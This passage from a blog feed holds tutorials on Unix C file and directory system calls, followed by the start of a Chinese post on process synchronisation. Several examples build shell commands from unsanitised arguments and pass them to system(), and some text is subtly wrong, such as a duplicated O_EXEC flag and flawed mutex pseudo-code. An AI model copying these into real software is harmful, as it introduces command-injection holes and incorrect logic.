</code></pre><p>You shouldn’t ever allocate objects of the struct dirent or DIR data types, since the directory access functions do that for you.</p>
<p>The description of struct dirent:</p>
<pre><code>#define __DARWIN_MAXPATHLEN    1024
struct dirent {
    __uint64_t  d_ino;      /* file number of entry */
    __uint64_t  d_seekoff;  /* seek offset (optional, used by servers) */
    __uint16_t  d_reclen;   /* length of this record */
    __uint16_t  d_namlen;   /* length of string in d_name */
    __uint8_t   d_type;     /* file type, see below */
    char      d_name[__DARWIN_MAXPATHLEN]; /* entry name (up to MAXPATHLEN bytes) */
}
</code></pre><p>The following contants are defined for d_type:</p>
<ul>
<li>DT_UNKNOWN         // The type is unknown.</li>
<li>DT_REG            // A regular file.</li>
<li>DT_DIR            // A directory.</li>
<li>DT_FIFO            // A named pipe, or FIFO.</li>
<li>DT_SOCK            // A local-domain socket.</li>
<li>DT_CHR            // A character device.</li>
<li>DT_BLK            // A block device.</li>
<li>DT_LNK            // A symbolic link. </li>
</ul>
<p>And how to check file type, you can see this: <a href="http://homeway.me/2017/03/03/apue-file-stat/#stat-type">http://homeway.me/2017/03/03/apue-file-stat/#stat-type</a></p>
<p>All directory information is in this struct, and we can read directory data one by one through <code>readdir()</code>. This function reads the next entry from the directory.</p>
<p>From api above, we can write a program to list directory, and read it`s information:</p>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;dirent.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;time.h&gt;
int dir_type(struct stat stat_buff) {
    // check file type from struct stat
    if (S_ISDIR(stat_buff.st_mode)) {
        return 1;
    }
    if (S_ISREG(stat_buff.st_mode)) {
        return 2;
    }
    return 0;        // consider as unknown file type
}
// dfs read directory, pathname can be positive/relative path
void dfs(char* pathname) {
    DIR* dir;
    struct dirent* dp;
    char next[1024];
    if ((dir = opendir(pathname)) == NULL) {
        printf(&quot;%s: opendir error&quot;, pathname);
        return;
    }
    // read directory info
    while ((dp = readdir(dir)) != NULL) {
        sprintf(next, &quot;%s/%s&quot;, pathname, dp-&gt;d_name);
        if (strcmp(dp-&gt;d_name, &quot;.DS_Store&quot;) == 0 || strcmp(dp-&gt;d_name, &quot;..&quot;) == 0 || strcmp(dp-&gt;d_name, &quot;.&quot;) == 0) {
            // skip current folder, father folder
            continue;
        }
        struct stat stat_buff;
        if (stat(next, &amp;stat_buff) &lt; 0) {
            printf(&quot;%s: stat error&quot;, pathname);
            continue;
        }
        // read file type
        int ret_stat = dir_type(stat_buff);
        switch (ret_stat) {
            case 1:
                printf(&quot;Dir =&gt; %s\n&quot;, next);
                dfs(next);        // for directory read child node 
                break;
            case 2:
                printf(&quot;File =&gt; path = %s; uid = %d; size = %lld; create_time = %s&quot;, next, stat_buff.st_uid, stat_buff.st_size, ctime(&amp;(stat_buff.st_mtime)));
                break;
        }
    }
    closedir(dir);
}

int main(int argc, char** argv) {
    if (argc == 1) {
       printf(&quot;Usage: %s pathname\n&quot;, argv[0]);
        return;
    }
    dfs(argv[1]);
}
</code></pre><blockquote>
<p>➜  $: gcc dir.c<br>➜  $: ./a.out ..</p>
</blockquote>
<pre><code>Dir =&gt; ../.git
Dir =&gt; ../.git/branches
File =&gt; path = ../.git/COMMIT_EDITMSG; uid = 501; size = 7; create_time = Fri Mar  3 20:41:12 2017
.........
</code></pre><p><hr><br></p>
<h3 id="3-chdir-fchdir-getcwd"><a href="#3-chdir-fchdir-getcwd" class="headerlink" title="3.chdir()/fchdir()/getcwd()"></a>3.chdir()/fchdir()/getcwd()</h3><pre><code>#include &lt;unistd.h&gt;
int chdir(const char* pathname)
int fchdir(int fd)
                                            - 成功返回：0；失败返回：-1
char * getcwd (char *buffer, size_t size)
                                            - 成功返回：cwd path；失败返回：NULL
</code></pre><p><hr><br></p>
<h1 id="0x02-ERROR"><a href="#0x02-ERROR" class="headerlink" title="0x02.ERROR"></a>0x02.ERROR</h1><p>Error code see here: <a href="http://homeway.me/2017/03/02/apue-file-io/#error">http://homeway.me/2017/03/02/apue-file-io/#error</a></p>
<p><br><hr></p>
<p>Reference:</p>
<ul>
<li><a href="https://www.gnu.org/software/libc/manual/" target="_blank" rel="external">The GNU C Library</a></li>
<li><a href="http://www.apuebook.com/apue3e.html" target="_blank" rel="external">Advanced Programming in the UNIX® Environment</a></li>
</ul>
<p>– Base api information are in book, so in my blog I only write some useful example.</p>
<p><br><hr></p>
<h4 id="本文出自-夏日小草-转载请注明出处-http-homeway-me-2017-03-04-apue-file-dir"><a href="#本文出自-夏日小草-转载请注明出处-http-homeway-me-2017-03-04-apue-file-dir" class="headerlink" title="本文出自 夏日小草,转载请注明出处:http://homeway.me/2017/03/04/apue-file-dir/"></a>本文出自 <a href="http://homeway.me">夏日小草</a>,转载请注明出处:<a href="http://homeway.me/2017/03/04/apue-file-dir/">http://homeway.me/2017/03/04/apue-file-dir/</a></h4><p>-by小草</p>
<p>2017-03-04 23:18:34</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Unix C Programming - file stat]]></title>
      <url>http://homeway.me/2017/03/03/apue-file-stat/</url>
      <content type="html"><![CDATA[<p><br></p>
<p><img src="https://static.blog.homeway.me/blog/img/gnu.png" alt="apue"></p>
<a id="more"></a>
<!-- https://static.blog.homeway.me/blog/img/apue-unix-linux.png -->
<h1 id="0x01-API"><a href="#0x01-API" class="headerlink" title="0x01.API"></a>0x01.API</h1><h2 id="1-stat-fstat-fstatat-lstat"><a href="#1-stat-fstat-fstatat-lstat" class="headerlink" title="1.stat()/fstat()/fstatat()/lstat()"></a>1.stat()/fstat()/fstatat()/lstat()</h2><pre><code>int stat (const char *filename, struct stat *buf)
int fstat (int filedes, struct stat *buf)
int lstat (const char *filename, struct stat *buf)
int fstatat(int fd, const char* restrict pathname, struct stat *restrict buff, int flag)
                                            - 成功返回：0；失败返回：-1
</code></pre><p>This four functions are all to read file attribute.<br><code>stat()</code> read file stat by file path, return file stat by stat point.<br><code>fstat()</code> read through a file decription.<br><code>fstatat()</code> read from a file decription and a relative catalog, flag is to control whether followed with a symbolic link.</p>
<p>stat struct information here:</p>
<pre><code>struct stat {
    mode_t st_mode;     // File mode, include file type / permission bits
    ino_t st_ino;        // File serial number
    dev_t st_dev;        // Identifies the device containing the file.
    nlink_t st_nlink;    // Hard links number of file.
    uid_t st_uid;        // The user ID of the file’s owner.
    gid_t st_gid;        // The group ID of the file. See File Owner.
    off_t st_size    ;    // Regular file size in bytes.
    time_t st_atime;    // Last access time.
    unsigned long int st_atime_usec;    // Fractional part of the last access time.
    time_t st_mtime;    // Last modification time
    unsigned long int st_mtime_usec;    // Fractional part of last modification time.
    time_t st_ctime;    // Last attributes modification time. 
    unsigned long int st_ctime_usec;    // Fractional part of the time.
    blkcnt_t st_blocks;    // This is the amount of disk space that the file occupies, measured in units of 512-byte blocks.
</code></pre><p>File type contains in <code>mode_t st_mode</code>. We can determine the file type with the macros.</p>
<p><img src="https://static.blog.homeway.me/blog/img/apue-file-dir-st_mode.png" alt="mode_t st_mode macros"></p>
<p><a id="stat-type"></a><br>Follow description of stat, writing an example to read file stat:</p>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;time.h&gt;
#include &lt;sys/stat.h&gt;
int main(int argc, char** argv) {
    if (argc &lt; 2) {
        printf(&quot;Usage: %s filepath\n&quot;, argv[0]);
        return 0;
    }
    struct stat buff;
    char ptr[512];
    for (int i = 1; i &lt; argc; ++i) {
        if (lstat(argv[i], &amp;buff) &lt; 0) {
            printf(&quot;last(%s) error\n&quot;, argv[i]);
            continue;
        }
        if (S_ISREG(buff.st_mode))
            sprintf(ptr, &quot;%s: regular file\n&quot;, argv[i]);
        else if (S_ISDIR(buff.st_mode))
            sprintf(ptr, &quot;%s: directory\n&quot;, argv[i]);
        else if (S_ISCHR(buff.st_mode))
            sprintf(ptr, &quot;%s: character special\n&quot;, argv[i]);
        else if (S_ISBLK(buff.st_mode))
            sprintf(ptr, &quot;%s: block special\n&quot;, argv[i]);
        else if (S_ISFIFO(buff.st_mode))
            sprintf(ptr, &quot;%s: FIFO file\n&quot;, argv[i]);
        else if (S_ISLNK(buff.st_mode))
            sprintf(ptr, &quot;%s: link file\n&quot;, argv[i]);
        else if (S_ISSOCK(buff.st_mode))
            sprintf(ptr, &quot;%s: sock&quot;, argv[i]);
        printf(&quot;%s&quot;, ptr);
        printf(&quot;name = %s, uid = %d, guid = %d\naccess time = %smodification time = %ssize = %lld, serial = %llu&quot;, argv[i], buff.st_uid, buff.st_gid, ctime(&amp;buff.st_atime), ctime(&amp;buff.st_ctime), buff.st_size, buff.st_ino);
        printf(&quot;\n&lt;===========================&gt;\n&quot;);
    }
    return 0;
}
</code></pre><blockquote>
<p>➜ $: gcc stat.c<br>➜ $: ./a.out stat.c</p>
</blockquote>
<pre><code>stat.c: regular file
name = stat.c, uid = 501, guid = 20
access time = Fri Mar  3 21:29:07 2017
modification time = Fri Mar  3 21:29:07 2017
size = 1320, serial = 4675975
&lt;===========================&gt;
</code></pre><hr>

<h2 id="2-access-faccessat"><a href="#2-access-faccessat" class="headerlink" title="2.access()/faccessat()"></a>2.access()/faccessat()</h2><pre><code>int access (const char *filename, int mode)
int faccessat (int fd, const char *filename, int mode, int flag)
                                            - 成功返回：0；失败返回：-1
</code></pre><p><code>access()</code>/<code>faccessat()</code> is used to test file access permission.<br>mode defined in macros: <code>R_OK</code>, <code>W_OK</code>, <code>X_OK</code>, is to check read/write/exec permission of a file.<br>access() = faccess() when <code>int fd</code> is absolute path file description or when fd = AT_FDCWD and filepath is relative path, example:</p>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;fcntl.h&gt;
int main(int argc, char** argv) {
    if (argc != 2) {
        printf(&quot;Usage: %s filepath\n&quot;, argv[0]);
        return 0;
    }
    if (access(argv[1], R_OK) &lt; 0)
        printf(&quot;%s: access error\n&quot;, argv[1]);
    else
        printf(&quot;%s: access ok\n&quot;, argv[1]);

    if (open(argv[1], O_RDONLY) &lt; 0)
        printf(&quot;%s: open error\n&quot;, argv[1]);
    else
        printf(&quot;%s: open successfuly\n&quot;, argv[1]);
    return 0;
}
</code></pre><hr>

<h2 id="3-umask"><a href="#3-umask" class="headerlink" title="3.umask()"></a>3.umask()</h2><pre><code>#include &lt;sys/stat.h&gt;
mode_t umask (mode_t mask)
                                - 返回：mode_t
</code></pre><p>In *nix, user permission is defined as 4+2+1, 4 = read permission, 2 = write permission, 1 = exec permission, for the more, if you have no permission to a directory, you can`t read this directory. Some common umask values are 002 to prevent others from writing your files, 022 to prevent group members and others from writing your files, and 027 to prevent group members from writing your files and others from reading, writing, or executing your files. We can read user permission from this picture:</p>
<p><img src="https://static.blog.homeway.me/blog/img/apue-file-dir-st_mode-permission.png" alt="permission"></p>
<p><a id="permision"></a><br>struct mode_t defined here:</p>
<pre><code>S_IRUSR     // Read permission bit for the owner. 0400
S_IWUSR    // Write permission bit for the owner. 0200
S_IXUSR    // Execute (for ordinary files) or search (for directories) permission bit for the owner. 0100
S_IRWXU     // This is equivalent to ‘(S_IRUSR | S_IWUSR | S_IXUSR)’.

S_IRGRP    // Read permission bit for the group owner. 0040
S_IWGRP    // Write permission bit for the group owner. 0020.
S_IXGRP    // Execute or search permission bit for the group owner. 0010
S_IRWXG    // This is equivalent to ‘(S_IRGRP | S_IWGRP | S_IXGRP)’.

S_IROTH    // Read permission bit for other users. 0004
S_IWOTH    // Write permission bit for other users. 0002
S_IXOTH    // Execute or search permission bit for other users. 0001
S_IRWXO    // This is equivalent to ‘(S_IROTH | S_IWOTH | S_IXOTH)’.
</code></pre><p>The Single UNIX Specification requires that the shell support a symbolic form of the umask command. Unlike the octal format, the symbolic format specifies which permissions are to be allowed instead of which ones are to be denied:</p>
<pre><code>#include &lt;fcntl.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;sys/types.h&gt;
int main(int argc, char** argv) {
    int fd;
     mode_t oldmask;
    printf(&quot;Your old umask is %i\n&quot;,oldmask = umask(S_IRWXG));
      if ((fd = creat(&quot;umask.file&quot;, S_IRWXU | S_IRWXG)) &lt; 0)
           perror(&quot;creat() error&quot;);
      else {
           system(&quot;ls -l umask.file&quot;);
        close(fd);
        unlink(&quot;umask.file&quot;);
      }
      umask(oldmask);
     return 0;
}
</code></pre><blockquote>
<p>➜ $: gcc umask.c<br>➜ $: ./a.out</p>
</blockquote>
<pre><code>Your old umask is 18
-rwx------  1 homeway  staff  0 Mar  3 22:41 umask.file
</code></pre><hr>

<h2 id="4-chmod-fchmod-fchmodat"><a href="#4-chmod-fchmod-fchmodat" class="headerlink" title="4.chmod()/fchmod()/fchmodat()"></a>4.chmod()/fchmod()/fchmodat()</h2><pre><code>#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt; 
int chmod(const char *path, mode_t mode);
int fchmod(int fildes, mode_t mode); 
int fchmodat(int fildes, const char *pathname, mode_t, int flag);
                                            - 成功返回：0；失败返回：-1
</code></pre><p>This three is easy to use, like command line: chmod xxxx filepath</p>
<h2 id="5-chown-fchown-fchownat"><a href="#5-chown-fchown-fchownat" class="headerlink" title="5.chown()/fchown()/fchownat()"></a>5.chown()/fchown()/fchownat()</h2><pre><code>#include &lt;sys/types.h&gt;
#include &lt;unistd.h&gt; 
int chown(const char *path, uid_t owner, gid_t group); 
int fchown(int fd, uid_t owner, gid_t group); 
int lchown(const char *path, uid_t owner, gid_t group); 
                                            - 成功返回：0；失败返回：-1
</code></pre><p>These system calls change the owner and group of the file specified by path or by fd.</p>
<p>An example to show how to use chmod/chown here:</p>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;sys/stat.h&gt;
int main(int argc, char** argv) {
    if (argc != 2) {
        printf(&quot;Usage: %s filename&quot;, argv[0]);
        return 0;
    }
    char cmd[128];
    sprintf(cmd, &quot;ls -l %s&quot;, argv[1]);
    printf(&quot;%s: file permission:\n&quot;, argv[1]);
    system(cmd);
    if (chmod(argv[1], (S_IRWXU | S_IRGRP | S_IROTH)) &lt; 0) {
        printf(&quot;%s: chmod error&quot;, argv[1]);
        return 0;
    } else {
        printf(&quot;\n%s: chmod =&gt; -rwxr--r--\n&quot;, argv[1]);
    }
    system(cmd);
}
</code></pre><blockquote>
<p>➜ $: gcc chmod.c<br>➜ $: ./a.out chmod</p>
</blockquote>
<pre><code>chmod: file permission:
-rwxr--r--  1 homeway  staff  13708 Mar  3 23:03 chmod
chmod: chmod =&gt; -rwxr--r--
-rwxr--r--  1 homeway  staff  13708 Mar  3 23:03 chmod
</code></pre><h2 id="6-truncate-ftruncate"><a href="#6-truncate-ftruncate" class="headerlink" title="6.truncate()/ftruncate()"></a>6.truncate()/ftruncate()</h2><pre><code>#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt; 
int truncate(const char *path, off_t length);
int ftruncate(int fd, off_t length); 
                                            - 成功返回：0；失败返回：-1
</code></pre><p>The truncate()/ftruncate() functions cause the regular file named by path or referenced by fd to be truncated to a size of precisely length bytes.</p>
<p>If the file previously was larger than this size, the extra data is lost. If the file previously was shorter, it is extended, and the extended part reads as null bytes (‘\0’). The file offset is not changed.</p>
<p>With ftruncate(), the file must be open for writing; with truncate(), the file must be writable.</p>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
int str2int(char* s) {
    int sum = 0, len = (int)strlen(s);
    for (int i = 0; i &lt; len; ++i) 
        sum = sum * 10 + s[i] - &#39;0&#39;;
    return sum;
}

int main(int argc, char** argv) {
    if (argc != 3) {
        printf(&quot;Usage: %s pathname length&quot;, argv[0]);
        return 0;
    }
    char cmd[128];
    sprintf(cmd, &quot;ls -l %s&quot;, argv[1]);
    system(cmd);
    if (truncate(argv[1], (off_t)(str2int(argv[2]))) &lt; 0) {
        printf(&quot;%s: truncate(%s, %s) error&quot;, argv[1], argv[1], argv[2]);
    }
    system(cmd);
    return 0;
}
</code></pre><blockquote>
<p>➜  $: gcc truncate.c<br>➜  $: ./a.out truncate 1024</p>
</blockquote>
<pre><code>-rwxr-xr-x  1 homeway  staff  13700 Mar  3 23:07 truncate
-rwxr-xr-x  1 homeway  staff  1024 Mar  3 23:08 truncate
</code></pre><h2 id="7-link-linkat-unlink-unlinkat-remove"><a href="#7-link-linkat-unlink-unlinkat-remove" class="headerlink" title="7.link()/linkat()/unlink()/unlinkat()/remove()"></a>7.link()/linkat()/unlink()/unlinkat()/remove()</h2><p>// TODO…</p>
<hr>

<h1 id="0x02-ERROR"><a href="#0x02-ERROR" class="headerlink" title="0x02.ERROR"></a>0x02.ERROR</h1><p>Error code see here: <a href="http://homeway.me/2017/03/02/apue-file-io/#error">http://homeway.me/2017/03/02/apue-file-io/#error</a></p>
<p><br><hr></p>
<p>Reference:</p>
<ul>
<li><a href="https://www.gnu.org/software/libc/manual/" target="_blank" rel="external">The GNU C Library</a></li>
<li><a href="http://www.apuebook.com/apue3e.html" target="_blank" rel="external">Advanced Programming in the UNIX® Environment</a></li>
</ul>
<p>– Base api information are in book, so in my blog I only write some useful example.</p>
<p><br><hr></p>
<h4 id="本文出自-夏日小草-转载请注明出处-http-homeway-me-2017-03-03-apue-file-stat"><a href="#本文出自-夏日小草-转载请注明出处-http-homeway-me-2017-03-03-apue-file-stat" class="headerlink" title="本文出自 夏日小草,转载请注明出处:http://homeway.me/2017/03/03/apue-file-stat/"></a>本文出自 <a href="http://homeway.me">夏日小草</a>,转载请注明出处:<a href="http://homeway.me/2017/03/03/apue-file-stat/">http://homeway.me/2017/03/03/apue-file-stat/</a></h4><p>-by小草</p>
<p>2017-03-03 23:18:34</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Unix C Programming - file i/o]]></title>
      <url>http://homeway.me/2017/03/02/apue-file-io/</url>
      <content type="html"><![CDATA[<p><br></p>
<p><img src="https://static.blog.homeway.me/blog/img/gnu.png" alt="apue"></p>
<a id="more"></a>
<!-- https://static.blog.homeway.me/blog/img/apue-unix-linux.png -->
<h1 id="0x01-API"><a href="#0x01-API" class="headerlink" title="0x01.API"></a>0x01.API</h1><p><a id="api"></a></p>
<h3 id="1-open-creat-close"><a href="#1-open-creat-close" class="headerlink" title="1. open()/creat()/close()"></a>1. open()/creat()/close()</h3><pre><code>#include &lt;fcntl.h&gt;
int creat (const char *filename, mode_t mode)
int open (const char *filename, int flags)
int open (const char *filename, int flags[, mode_t mode])
                                            - 成功返回：fd；失败返回：-1
int close (int filedes)
                                            - 成功返回：0；失败返回：-1
</code></pre><p>The open() function creates and returns a new file descriptor for the file named by filename. Initially, the file position indicator for the file is at the beginning of the file. </p>
<p>The flags argument controls how the file is to be opened. This is a bit mask; you create the value by the bitwise OR of the appropriate parameters (using the ‘|’ operator in C). See File Status Flags, for the parameters available.</p>
<p>File Status Flags:</p>
<blockquote>
<p>O_RDONLY     =&gt; 只读打开<br>O_WRONLY     =&gt; 只写打开<br>O_RDWR       =&gt; 读写打开<br>O_EXEC      =&gt; 执行打开<br>O_APPEND    =&gt; 追加打开，且线程安全<br>O_CREAT     =&gt; 若文件不存在，创建文件，需要添加第三项参数描述文件权限<br>O_EXEC        =&gt; 如果使用了O_CREAT而且文件已经存在，就会发生一个错误<br>O_NOBLOCK    =&gt; 以非阻塞的方式打开一个文件<br>O_TRUNC        =&gt; 如果文件已经存在，则删除文件的内容<br>O_SYNC        =&gt; write等待写入完成后才返回</p>
</blockquote>
<p>If added <code>O_CREAT</code> then open() = creat(), the argument mode (see Permission Bits) is used only when a file is created, but it doesn’t hurt to supply the argument in any case.</p>
<p>Permission Bits:</p>
<blockquote>
<p>S_IRUSR        =&gt; 用户可以读<br>S_IWUSR        =&gt; 用户可以写<br>S_IXUSR        =&gt; 用户可以执行<br>S_IRWXU        =&gt; 用户可以读、写、执行<br>S_IRGRP        =&gt; 组可以读<br>S_IWGRP        =&gt; 组可以写<br>S_IXGRP        =&gt; 组可以执行<br>S_IRWXG        =&gt; 组可以读写执行<br>S_IROTH        =&gt; 其他人可以读<br>S_IWOTH        =&gt; 其他人可以写<br>S_IXOTH        =&gt; 其他人可以执行<br>S_IRWXO        =&gt; 其他人可以读、写、执行<br>S_ISUID        =&gt; 设置用户执行ID<br>S_ISGID        =&gt; 设置组的执行ID</p>
</blockquote>
<h3 id="2-read-pread"><a href="#2-read-pread" class="headerlink" title="2.read()/pread()"></a>2.read()/pread()</h3><pre><code>ssize_t read (int filedes, void *buffer, size_t size)
ssize_t pread (int filedes, void *buffer, size_t size, off_t offset)
                                            - 成功返回：读取byte数；失败返回：-1
</code></pre><p>The read() function reads up to size bytes from the file with descriptor filedes, storing the results in the buffer.The return value is de number of bytes actually read. The number might actually smaller than <code>size</code>, for the sake of not enough bytes left or if there aren’t that many bytes immediately available. But if return value is -1, then error happens.</p>
<p>The pread() function not read from the current file descriptor filedes, but read from <code>offset</code> of file begin.</p>
<h3 id="3-write-pwrite"><a href="#3-write-pwrite" class="headerlink" title="3.write()/pwrite()"></a>3.write()/pwrite()</h3><pre><code>ssize_t write (int filedes, const void *buffer, size_t size)
ssize_t pwrite (int filedes, const void *buffer, size_t size, off_t offset)
                                            - 成功返回：写入byte数；失败返回：-1
</code></pre><p>Ok, write()/pwrite() is the same as read.</p>
<p>We can write an example to copy file like linux command, example here: (Usage: ./a.out frompath topath)</p>
<pre><code>#include &lt;fcntl.h&gt;
#include &lt;stdio.h&gt;
#include &lt;errno.h&gt;
#define BUFFSIZE 1024
int main(int argc, char** argv) {
    if (argc != 3) {
        printf(&quot;Usage: ./a.out frompath topath\n&quot;);
        exit(1);
    }
    char buff[BUFFSIZE];
    int fd1, fd2, read_byte, write_byte;
    if ((fd1 = open(argv[1], O_RDONLY)) &lt; 0) {
        printf(&quot;%s: open file error\n&quot;, argv[1]);
        exit(1);
    }
    if ((fd2 = open(argv[2], O_WRONLY | O_CREAT, S_IRUSR | S_IWUSR)) &lt; 0) {
        printf(&quot;%s: create file error&quot;, argv[2]);
        exit(1);
    }
    while ((read_byte = read(fd1, buff, BUFFSIZE)) != 0) {
        if (read_byte == -1 &amp;&amp; (errno != EINTR)) {
            printf(&quot;%s: read buff error\n&quot;, argv[1]);
        } else if (read_byte &gt; 0) {
            write_byte = write(fd2, buff, read_byte);
            if (write_byte == -1) {
                printf(&quot;%s: write buff error\n&quot;, argv[2]);
            }
        }
    }
    close(fd1);
    close(fd2);
    return 0;
}
</code></pre><blockquote>
<p>➜  $: gcc cp.c<br>➜  $: echo “1234567890” &gt; test1<br>➜  $: ./a.out test1 test2<br>➜  $: ll test*</p>
</blockquote>
<pre><code>-rw-r--r--  1 homeway  staff    11B Mar  2 21:48 test1
-rw-------  1 homeway  staff    11B Mar  2 21:48 test2
</code></pre><p>error see here: <a href="#error">http://homeway.me/2017/03/02/apue-file-io/#error</a></p>
<h3 id="4-lseek"><a href="#4-lseek" class="headerlink" title="4.lseek()"></a>4.lseek()</h3><pre><code>off_t lseek(int fd, off_t offset, int whence)
                                            - 成功返回：偏移量；失败返回：-1
</code></pre><p>Every open file has a current file offset, always is a positive. lseek() can change current file offset, <code>offset</code> can be positive or negetive, <code>whence</code> followed here:</p>
<blockquote>
<p>SEEK_SET =&gt; offset begin from index = 0<br>SEEK_CUR =&gt; offset begin from current point, offset can be positive or negetive<br>SEEK_END =&gt; add file size, offset can be positive or negetive</p>
</blockquote>
<p>If offset if bigger than file size, we can create a file hole, example here:</p>
<pre><code>#include &lt;fcntl.h&gt;
#include &lt;stdio.h&gt;
int main(int argc, char** argv) {
    if (argc == 1) {
        printf(&quot;Usage: %s pathname&quot;, argv[0]);
        exit(1);
    }
    int fd;
    if ((fd = creat(argv[1], FILE_MODE)) &lt; 0) {
        err_sys(&quot;create file %s error&quot;, argv[1]);
    }
    char buff1[11] = {&quot;1234567890&quot;};
    char buff2[11] = {&quot;abcdefghij&quot;};
    if (write(fd, buff1, 10) != 10) {
        err_sys(&quot;write %s error&quot;, argv[1]);
    }
    if (lseek(fd, 1024, SEEK_SET) &lt; 0) {
        err_sys(&quot;lseek %s error&quot;, argv[1]);
    }
    if (write(fd, buff2, 10) != 10) {
        err_sys(&quot;write %s error&quot;, argv[1]);
    }
    char cmd[1024];
    sprintf(cmd, &quot;od -c %s&quot;, argv[1]);
    system(cmd);
    return 0;
}
</code></pre><blockquote>
<p>➜  $: gcc lseek.c<br>➜  $: ./a.out</p>
</blockquote>
<pre><code>0000000    1   2   3   4   5   6   7   8   9   0  \0  \0  \0  \0  \0  \0
0000020   \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0  \0
*
0002000    a   b   c   d   e   f   g   h   i   j
0002012
</code></pre><p><a id="error"></a></p>
<hr>

<h1 id="0x02-Error"><a href="#0x02-Error" class="headerlink" title="0x02.Error"></a>0x02.Error</h1><p>File error is defined in <error.h>:</error.h></p>
<ul>
<li><p>EACCES<br>The process does not have search permission for a directory component of the file name.</p>
</li>
<li><p>ENAMETOOLONG<br>This error is used when either the total length of a file name is greater than PATH_MAX, or when an individual file name component has a length greater than NAME_MAX. See Limits for Files.</p>
</li>
<li><p>ENOENT<br>This error is reported when a file referenced as a directory component in the file name doesn’t exist, or when a component is a symbolic link whose target file does not exist. See Symbolic Links.</p>
</li>
<li><p>ENOTDIR<br>A file that is referenced as a directory component in the file name exists, but it isn’t a directory.</p>
</li>
<li><p>ELOOP<br>Too many symbolic links were resolved while trying to look up the file name. The system has an arbitrary limit on the number of symbolic links that may be resolved in looking up a single file name, as a primitive way to detect loops. See Symbolic Links.</p>
</li>
</ul>
<p><br><hr></p>
<p>Reference:</p>
<ul>
<li><a href="https://www.gnu.org/software/libc/manual/" target="_blank" rel="external">The GNU C Library</a></li>
<li><a href="http://www.apuebook.com/apue3e.html" target="_blank" rel="external">Advanced Programming in the UNIX® Environment</a></li>
</ul>
<p><br><hr></p>
<h4 id="本文出自-夏日小草-转载请注明出处-http-homeway-me-2017-03-02-apue-file-io"><a href="#本文出自-夏日小草-转载请注明出处-http-homeway-me-2017-03-02-apue-file-io" class="headerlink" title="本文出自 夏日小草,转载请注明出处:http://homeway.me/2017/03/02/apue-file-io/"></a>本文出自 <a href="http://homeway.me">夏日小草</a>,转载请注明出处:<a href="http://homeway.me/2017/03/02/apue-file-io/">http://homeway.me/2017/03/02/apue-file-io/</a></h4><p>-by grasses</p>
<p>2017-03-02 21:52:34</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Understand OS - Process]]></title>
      <url>http://homeway.me/2017/01/13/understand-os-process-mutex-and-synchronization/</url>
      <content type="html"><![CDATA[<p><br></p>
<p><img src="https://static.blog.homeway.me/blog/2017-01-13-understand-os-process-mutex-and-synchronization-deadlock.jpg" alt="OS Process"></p>
<a id="more"></a>
<p>虽然进程可以共享系统资源，但是许多资源在同一时刻只能被一个进程共享，一次只允许一个进程共享的资源就是临界资源。临界资源的访问过程有四个部分：进入区、临界区、退出区、剩余区。</p>
<pre><code>do {
    entry section;
    critical section;
    exit section;
    remainder section;
} while(true);
</code></pre><p>进程同步要求进程之间通过信号量进行等待、传递信息产生制约关系；进程互斥要求进程间遵守：空闲让进、忙则等待、有限等待、让权等待。让权等待是指当进程不能进入临界区时，应立即释放处理器防止进程忙等待。</p>
<p><br></p>
<h1 id="0x01-同步与互斥原型"><a href="#0x01-同步与互斥原型" class="headerlink" title="0x01.同步与互斥原型"></a>0x01.同步与互斥原型</h1><p>临界区的实现主要有硬件和软件方法。<br>硬件实现的一个方法是中断屏蔽法，主要通过<code>关中断=&gt;临界区=&gt;开中断实现</code>，由于CPU只有在中断中才能进行进程调度，所以屏蔽中断可以将进程内代码顺利执行完毕；而硬件方法还有另外一种TestAndSet硬件指令法。由于TestAndSet是原子操作不可再分割，从而保证了指令能在顺利执行完毕，功能如下：</p>
<pre><code>bool TestAndSet(boolean *lock) {
    boolean old;
    old = *lock;
    *lock = true;
    return old;
}
</code></pre><p>软件屏蔽有几种方法：</p>
<h3 id="1-单标志法"><a href="#1-单标志法" class="headerlink" title="1.单标志法"></a>1.单标志法</h3><pre><code>Process1() {                        Process2() {
    while(turn != 0) {                    while(turn != 1) {
        critical section;                    critical section;
        turn = 1;                            turn = 0;
        remainder section;                    remainder section;
    }                                    }
}                                    }
</code></pre><p>如果两个进程交替进入临界区，该算法能保证每次只允许一个进程进入临界区，但是当一个进程长期不再进入临界区，另一个进程就无法再进入临界区，从而违背了“空闲让进”。</p>
<h3 id="2-双标志先检查法"><a href="#2-双标志先检查法" class="headerlink" title="2.双标志先检查法"></a>2.双标志先检查法</h3><pre><code>Process1() {                        Process2() {
    while(flag[2]) {}                    while(flag[1]) {}
    flag[1] = true;                        flag[2] = true;
    critical section;                    critical section;
    flag[1] = false;                       flag[2] = false;
    remainder section;                    remainder section;
}                                    }
</code></pre><p>算法的基本思想是在每个进程访问临界区之前查看下对方是否在访问临界区，若正在访问则需要等待，否则进程进入临界区并设置临界区访问标志。双标志可以不用交替进入临界区运行，但是P1()和P2()在1时刻同时进入 <code>while(flag[]) {}</code> 可能会出现P1()和P2()同时进入临界区，违背忙则等待。</p>
<h3 id="3-双标志后检查"><a href="#3-双标志后检查" class="headerlink" title="3.双标志后检查"></a>3.双标志后检查</h3><pre><code>process1() {                        process2() {
    flag[1] = true;                            flag[2] = true;
    while(flag[2]) {}                        while(flag[1]) {}
    critical section;                        critical section;
    flag[1] = false;                            flag[2] = false;
    remainder section;                        remainder section;
}                                    }
</code></pre><p>双标志后检查是对双标志法的改进，为了防止进程同时进入临界区，采用先置标志法 <code>flag[i] = true;</code> 保证了临界资源的互斥性。但是当两个进程P1()和P2()都想进入临界区同时置标志，会导致进程相互谦让都无法进入临界区，从而导致了”饥饿”。</p>
